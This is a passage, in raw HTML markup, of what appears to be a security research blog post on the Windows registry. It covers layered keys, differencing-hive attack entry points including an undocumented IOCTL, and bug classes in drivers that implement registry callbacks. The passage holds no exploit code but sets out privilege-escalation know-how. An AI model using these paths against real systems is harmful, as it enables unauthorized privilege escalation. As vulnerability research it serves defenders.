perspective.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In addition to them, it is also worth analyzing the rollback functionality, which is used both when the rollback is requested directly by the user and when an error occurs in the prepare stage.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This part is mainly handled by the CmpTransMgrFreeVolatileData function.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.81kgqapw5f6t&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c34&quot;&gt;Layered keys&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Layered keys are the latest major change of this type in the Windows Registry, introduced in 2016.&lt;/span&gt;&lt;span&gt;&amp;nbsp;They&lt;/span&gt;&lt;span&gt;&amp;nbsp;overturned many fundamental assumptions that had been in place until then. A given logical key no longer consists solely of one key node and a maximum of one active KCB, but of a whole stack of these objects: from the layer height of the given hive down to layer zero, which is the base hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A key that has a key node may in practice be non-existent (if marked as a &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;tombstone&lt;/span&gt;&lt;span&gt;), and vice versa, a key without a key node may logically exist if there is an existing key with the same name lower in its stack.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In short, this whole containerization mechanism has doubled the complexity of every single registry operation, because:&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_bb177mxms8kw-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Querying for information about a key has become more difficult, because instead of gathering information from just one key, it has to be potentially collected from many keys at once and combined into a coherent whole for the caller.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Performing any &amp;quot;write&amp;quot; operations has become more difficult because before writing any information to the key at a given nesting level, you first need to make sure that the key and all its ancestors in a given hive exist, which is done in a complicated process called &amp;quot;key promotion&amp;quot;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;Deleting and renaming a key has become more difficult, because you always have to consider and correctly handle higher-level keys that rely on the one you are modifying. This is especially true for Merge-Unbacked keys, which do not have their own representation and only reflect the state of the keys at a lower level.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This also applies to ordinary keys from hives under HKLM and HKU, which by themselves have nothing to do with differencing hives, but as an integral part of the registry hierarchy, they also have to correctly support this feature.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c10 c7 li-bullet-0&quot;&gt;&lt;span&gt;P&lt;/span&gt;&lt;span&gt;erforming security access checks on a key has become more challenging&lt;/span&gt;&lt;span&gt;&amp;nbsp;d&lt;/span&gt;&lt;span&gt;ue to the need to accurately pinpoint the relevant security descriptor on the key stack&lt;/span&gt;&lt;span&gt;&amp;nbsp;first.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Overall, the layered keys mechanism is so complex that it could warrant an entire blog post (or several) on its own, so I won&amp;#39;t be able to explain all of its aspects here.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Nevertheless, its existence will quickly become clear to anyone who starts reversing the registry implementation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The code related to this functionality can be identified in many ways, for example:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_qd1fllvblyr-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;y references to functions that initialize the key node stack / KCB stack objects (i.e., CmpInitializeKeyNodeStack, CmpStartKcbStack, and CmpStartKcbStackForTopLayerKcb),&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;y dedicated functions that implement a given operation specifically on layered keys that end with &amp;quot;LayeredKey&amp;quot; (e.g., CmDeleteLayeredKey, CmEnumerateValueFromLayeredKey, CmQueryLayeredKey), &lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;B&lt;/span&gt;&lt;span&gt;y references to the KCB.LayerHeight field, which is very often used to determine whether the code is dealing with a layered key (height greater than zero) or a base key (height equal to zero).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;I encourage those interested in further exploring this topic to read Microsoft&amp;#39;s &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://patents.google.com/patent/US20170279678A1/en&quot;&gt;Containerized Configuration&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;patent (US20170279678A1), the &amp;quot;Registry virtualization&amp;quot; section in Chapter 10 of &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://www.google.com/books/edition/Windows_Internals_Part_2/L8UIvAEACAAJ?hl=en&quot;&gt;Windows Internals (Part 2, 7th Edition)&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, as well as my previous &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/04/the-windows-registry-adventure-6-kernel.html&quot;&gt;6&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, where I briefly described many internal structures related to layered keys.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;All of these &lt;/span&gt;&lt;span&gt;references &lt;/span&gt;&lt;span&gt;are great resources that can provide a good starting point for further analysis.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;When it comes to layered keys in the context of attack entry points, it&amp;#39;s important to note that loading custom differencing hives in Windows is not straightforward.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As I wrote in&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;blog post&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;&amp;nbsp;#&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2024/10/the-windows-registry-adventure-4-hives.html&quot;&gt;4&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, loading this type of hive is not possible at &lt;/span&gt;&lt;span&gt;all &lt;/span&gt;&lt;span&gt;through any standard NtLoadKey-family syscall&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Instead, it is done by sending an undocumented IOCTL 0x220008 to \Device\VRegDriver, which then passes this request on to an internal kernel function named CmLoadDifferencingKey.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, the first obstacle is that in order to use this IOCTL interface, one would have to reverse engineer the layout of its corresponding input structure. Fortunately, I have already done it and published it in the blog post under the VRP_LOAD_DIFFERENCING_HIVE_INPUT name.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However, a&lt;/span&gt;&lt;span&gt;&amp;nbsp;second, much more pressing problem is that communicating with the VRegDriver requires administrative rights, so it can only be used for testing purposes, but not in practical privilege escalation attacks.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;So, what options are we left with?&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Firstly, there are potential scenarios where the exploit is packaged in a mechanism that legitimately uses differencing hives, e.g., an MSIX-packaged application running in an app silo, or a specially crafted Docker container running in a server silo.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In such cases, we provide our own hives by design, which are then loaded on the victim&amp;rsquo;s &lt;/span&gt;&lt;span&gt;syste&lt;/span&gt;&lt;span&gt;m on our behalf when the malicious program or container is started.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The second option is to simply ignore the inability to load our own hive and use one already present in the system.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In a default Windows installation, many built-in applications use differencing hives, and the \Registry\WC key can be easily enumerated and opened without any problems (unlike \Registry\A).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, if we launch a program running inside an app silo (e.g., Notepad) as a local user, we can then operate on the differencing hives loaded by it. This is exactly what I did in most of my proof-of-concept exploits related to this functionality.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Of course, it is possible that a given bug will require full binary control over the differencing hive in order to trigger it, but this is a relatively rare case: of the 10 vulnerabilities I identified in this code, only two of them required such a high degree of control over the hive.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ujDEXfwdRL-c28 ujDEXfwdRL-c11&quot; id=&quot;h.r6arhjnt6uym&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c42&quot;&gt;Alternative registry attack targets&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;The most crucial attack surface associated with the registry is obviously its implementation within the Windows kernel.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However&lt;/span&gt;&lt;span&gt;, other types of software interact with the registry in many ways and can be also prone to privilege escalation attacks through this mechanism.&lt;/span&gt;&lt;span&gt;&amp;nbsp;They &lt;/span&gt;&lt;span&gt;are discussed in the following sections.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ujDEXfwdRL-c2&quot; id=&quot;h.hpbk5jo5oxgm&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c25 ujDEXfwdRL-c20&quot;&gt;Drivers implementing registry callbacks&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Another area where potential registry-related security vulnerabilities can be found is Registry Callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This mechanism, first introduced in Windows XP and still present today, provides an interface for kernel drivers to log or interfere with registry operations in real-time.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;One of the most obvious uses for this functionality is antivirus software, which relies on registry monitoring.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Microsoft, aware of this need but wanting to avoid direct syscall hooking by drivers, was compelled to provide developers with an official, documented API for this purpose.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;From a technical standpoint, callbacks can be registered using either the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallback&quot;&gt;CmRegisterCallback&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;function or its more modern version, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmregistercallbackex&quot;&gt;CmRegisterCallbackEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The documentation for these functions serves as a good starting point for exploring the mechanism, as it seamlessly leads to the documentation of the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-ex_callback_function&quot;&gt;callback function itself&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and from there to the documentation of all the structures that describe the individual operations.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Generally speaking, callbacks can monitor virtually any type of registry operation, both before (&amp;quot;pre&amp;quot; callbacks) and after (&amp;quot;post&amp;quot; callbacks) it is performed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;They can be used to inspect what is happening in the system and log the details of specific events of interest.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Callbacks can also influence the outcome of an operation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In &amp;quot;pre&amp;quot; notifications, they can modify input data or completely take control of the operation and return arbitrary information to the caller while bypassing the standard operation logic.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;During &amp;quot;post&amp;quot; notification handling, it is possible to influence both the status returned to the user and the output data.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Overall, depending on the amount and types of operations supported in a callback, a completely error-free implementation can be really difficult to write.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It requires excellent knowledge of the inner workings of the registry, as well as a very thorough reading of the documentation related to callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The contracts that exist between the Windows kernel and the callback code can be very complicated, so in addition to the sources mentioned above, it&amp;#39;s also worth reading the entire separate series of seven articles detailing various callback considerations, titled &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/filtering-registry-calls&quot;&gt;Filtering Registry Calls&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Here are some examples of things that can go wrong in the implementation of callbacks:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_b0yx1r9fgw53-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Standard user-mode memory access bugs.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As per the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-ex_callback_function#remarks&quot;&gt;documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;(refer to the table at the bottom of the Remarks section), pointers to output data received in &amp;quot;post&amp;quot; type callbacks contain the original user-mode addresses passed to the syscall by the caller.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This means that if the callback wants to reference this data in any way, the only guarantee it has is that these pointers have been previously probed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, it is still important to access this memory within a try/except block and to avoid potential double-fetch vulnerabilities by always copying the data to a kernel-mode buffer first before operating on it.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;A somewhat related but higher-level issue is excessive trust in the output data structure within &amp;quot;post&amp;quot; callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The problem is that some registry syscalls return data in a strictly structured way, and since the &amp;quot;post&amp;quot; callback executes before returning to user mode, it might seem safe to trust that the output data conforms to its documented format (if one wants to use or slightly modify it).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An example of such a syscall is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwquerykey&quot;&gt;NtQueryKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, which returns a &lt;/span&gt;&lt;span&gt;specific structure for &lt;/span&gt;&lt;span&gt;each of the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ne-wdm-_key_information_class&quot;&gt;several possible information classes&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In theory, it would appear that a malicious program has not yet had the opportunity to modify this data, and it should still be valid when the callback executes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In practice, however, this is not the case, because the output data has already been copied to user-mode, and there may be a parallel user thread modifying it concurrently.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, it is very important that if one wants to use the output data in the &amp;quot;post&amp;quot; callback, they must first fully sanitize it, assuming that &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;it may be completely arbitrary and is as untrusted as any other input data.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Moving up another level, it&amp;#39;s important to prevent confused deputy problems that exploit the fact that callback code runs with kernel privileges.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For example, if a callback wanted to redirect access to certain registry paths to another location, and it used the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatekey&quot;&gt;ZwCreateKey&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;call without the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_object_attributes#members&quot;&gt;OBJ_FORCE_ACCESS_CHECK&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;flag to do so, it would allow an attacker to create keys in locations where they normally wouldn&amp;#39;t have access.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Bugs in the emulation of certain operations&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &amp;quot;pre&amp;quot;-type callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;If a callback decides to handle a given request on its own and signal this to the kernel by returning the STATUS_CALLBACK_BYPASS code, it is responsible for filling all important fields in the corresponding REG_XXX_KEY_INFORMATION structure so that, in accordance with the expected syscall behavior, the output data is correctly returned to the caller&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/handling-notifications&quot;&gt;source&lt;/a&gt;&lt;/span&gt;&lt;span&gt;: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;&amp;quot;When a registry filtering driver&amp;#39;s RegistryCallback routine receives a pre-notification [...]&amp;quot;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;&amp;quot;Alternatively, if the driver changes a status code from failure to success, it might have to provide appropriate output parameters.&amp;quot;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Bugs in &amp;quot;post&amp;quot;-type callbacks&lt;/span&gt;&lt;span&gt;&amp;nbsp;that change an operation&amp;#39;s status from success to failure. If we want to block an operation after it has already been executed, we must remember that it has already occurred, with all its consequences and side effects.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To successfully pretend that it did not succeed, we would have to reverse all its visible effects for the user and release the resources allocated for this purpose.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;For some operations, this is very difficult or practically impossible to do cleanly, so I would personally recommend only blocking operations at the &amp;quot;pre&amp;quot; stage and refraining from trying to influence their outcome at the &amp;quot;post&amp;quot; stage (&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/handling-notifications&quot;&gt;source&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c13&quot;&gt;&amp;quot;If the driver changes a status code from success to failure, it might have to deallocate objects that the configuration manager allocated.&amp;quot;&lt;/span&gt;&lt;span&gt;).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Challenges presented by e&lt;/span&gt;&lt;span&gt;rror handling within &amp;quot;post&amp;quot;-type callbacks.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As per the &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/handling-notifications&quot;&gt;documentation&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the kernel only differentiates between a STATUS_CALLBACK_BYPASS return value and all others&lt;/span&gt;&lt;span&gt;, which means that it&lt;/span&gt;&lt;span&gt;&amp;nbsp;doesn&amp;#39;t really discern callback success or failure.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is somewhat logical since, at this stage, there isn&amp;#39;t a good way to handle failures &amp;ndash; the operation has already been performed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;On the other hand, it may be highly unintuitive, as &lt;/span&gt;&lt;span&gt;the Windows kernel idiom &amp;quot;if (!NT_SUCCESS(Status)) { return Status; }&amp;quot; becomes ineffective here.&lt;/span&gt;&lt;span&gt;&amp;nbsp;If an error is returned, it &lt;/span&gt;&lt;span&gt;won&amp;#39;t propagate to user mode, and will only cause premature callback exit, potentially leaving some important operations unfinished.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;To address this, you should design &amp;quot;post&amp;quot; callbacks to be inherently fail-safe (e.g., include no dynamic allocations)&lt;/span&gt;&lt;span&gt;, or i&lt;/span&gt;&lt;span&gt;f this isn&amp;#39;t feasible, implement error handling cautiously, ensuring that minor operation failures don&amp;#39;t compromise the callback&amp;#39;s overall logical/security guarantees.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Issues surrounding the use of a key object pointer passed to the callback, in one of a few specific scenarios where it can have a non-NULL value but not point to a valid key object.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This topic is explored in a short article in Microsoft Learn:&lt;/span&gt;&lt;span&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/invalid-key-object-pointers-in-registry-notifications&quot;&gt;&amp;nbsp;&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/invalid-key-object-pointers-in-registry-notifications&quot;&gt;Invalid Key Object Pointers in Registry Notifications&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Issues in open/create operation callbacks due to missing or incorrect handling of symbolic links and other redirections, which are characterized by the return values STATUS_REPARSE and STATUS_REPARSE_GLOBAL.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Bugs &lt;/span&gt;&lt;span&gt;that result from a lack of transaction support where it is needed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;This could be an &lt;/span&gt;&lt;span&gt;incorrect assumption that every operation performed on the registry is non-transactional and its effect is visible immediately, and not only after the transaction is committed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The API function that is used to retrieve the transaction associated with a given key (if it exists) during callback execution is &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmgetboundtransaction&quot;&gt;CmGetBoundTransaction&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Issues arising from using the older API version, &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmcallbackgetkeyobjectid&quot;&gt;CmCallbackGetKeyObjectID&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, instead of the newer &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-cmcallbackgetkeyobjectidex&quot;&gt;CmCallbackGetKeyObjectIDEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The older version has some inherent problems discussed in the documentation, such as returning an outdated key path if the key name has been changed by an NtRenameKey operation.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c4 c7 li-bullet-0&quot;&gt;&lt;span&gt;Issues stemming from an overreliance on the CmCallbackGetKeyObjectID(Ex) function to retrieve a key&amp;#39;s full path.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A local user can cause these functions to 